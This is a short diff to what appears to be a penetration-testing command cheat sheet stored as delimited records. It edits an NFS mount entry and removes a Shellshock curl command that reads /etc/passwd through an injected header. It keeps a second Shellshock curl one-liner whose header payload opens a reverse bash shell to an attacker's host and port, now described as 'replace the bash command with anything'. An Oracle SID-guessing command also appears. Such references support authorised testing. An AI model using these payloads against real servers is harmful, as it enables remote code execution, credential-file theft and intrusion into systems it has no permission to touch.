@@ -1,4 +1,4 @@
-mount -t nfs 10.0.0.2:/their/share /mnt/yourfolder -o nolock
+mount -t nfs 10.0.0.2:[/their/share] [/Mount/point] -o nolock
 Mount a NFS share (check for root squash)
 BaffledJimmy
 EOC
@@ -6,15 +6,6 @@ nfs
 fileshare
 EOT
 https://www.centos.org/docs//4/4.5/Reference_Guide/s2-nfs-client-config-options.html
-EOR
-curl -k https://[ip]/path/to/cgi/folder- bin/name_of_vuln_cgi.cgi -H "custom:() { ignored; }; echo Content- Type: text/html; echo ; /bin/cat /etc/passwd "
-Curl exploit shellshock
-rebootuser
-EOC
-shellshock
-web application
-EOT
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
 EOR
 /path/to/odat/odat-libc2.5-x86_64 sidguesser -s [IP]
 Used to guess common SIDs in Oracle databases
@@ -67,7 +58,7 @@ EOT
 https://serverfault.com/questions/305448/snmpget-over-ipv6
 EOR
 curl http://192.168.123.123/path/to/cgi- bin/name_of_vuln_cgi -H "custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 "
-Use -k switch to force curl to bypass any SSL warnings
+Exploit shellshock via curl, use -k switch to force curl to bypass any SSL warnings. Replace the bash command with anything.
 BaffledJimmy
 EOC
 shellshock
